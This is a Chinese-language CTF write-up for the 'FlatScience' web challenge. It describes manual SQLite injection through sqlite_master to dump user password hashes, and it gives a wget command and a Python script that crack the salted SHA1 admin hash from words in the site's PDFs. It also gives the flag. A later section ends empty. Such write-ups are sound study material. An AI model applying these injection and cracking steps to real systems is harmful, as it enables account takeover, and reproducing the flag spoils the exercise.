## DiffucultyFour

### FlatScience

1. 刊载了各种科学论文，点击页面上的url，跳转到不同的论文
2. 访问robots.txt，暴露了两个文件，login.php，admin.php，都是登陆页面，查看页面源代码，再login.php处发现了debug参数，设置debug=1，得到了页面源码，sqllite3数据库，且有明显的sql注入，查询得到的内容返回给cookie，并且立刻重定向，这样sqlmap就不行了，手工查询，sqllite下也有一个与mysql的information_schema的数据库，是SQLite_master，逐步查询，得到了当前数据库下的表users：

   ```
   id name password hint
   1 admin 3fab54a50e770d830c0416df817567662a9dc85c +my+fav+word+in+my+fav+paper?!
   2 fritze 54eae8935c90f467427f05e4ece82cf569f89507 +my+love+is…?
   3 hansi 34b0bb7c304949f9ff2fc101eef0f048be10d3bd +the+password+is+pa
   ```
3. 密码的提示，一个最喜爱的单词拼接字符串"Salz!"后sha1加密，加密后值为3fab54a50e770d830c0416df817567662a9dc85c，这个单词就是密码
4. 将所有论文下载下来 `wget http://61.147.171.105:53007/ -r -np -nd -A .pdf `，提取出所有的单词，逐个尝试，脚本如下：

   ```python
   from cStringIO import StringIO
   from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
   from pdfminer.converter import TextConverter
   from pdfminer.layout import LAParams
   from pdfminer.pdfpage import PDFPage
   import sys
   import string
   import os
   import hashlib

   def get_pdf():
   	return [i for i in os.listdir("./") if i.endswith("pdf")]


   def convert_pdf_2_text(path):
       rsrcmgr = PDFResourceManager()
       retstr = StringIO()
       device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
       interpreter = PDFPageInterpreter(rsrcmgr, device)
       with open(path, 'rb') as fp:
           for page in PDFPage.get_pages(fp, set()):
               interpreter.process_page(page)
           text = retstr.getvalue()
       device.close()
       retstr.close()
       return text


   def find_password():
   	pdf_path = get_pdf()
   	for i in pdf_path:
   		print "Searching word in " + i
   		pdf_text = convert_pdf_2_text(i).split(" ")
   		for word in pdf_text:
   			sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
   			if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
   				print "Find the password :" + word
   				exit()

   if __name__ == "__main__":
   	find_password()
   ```

   单词为 `ThinJerboa`
5. 以admin登录

flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}

### wife_wife

1.
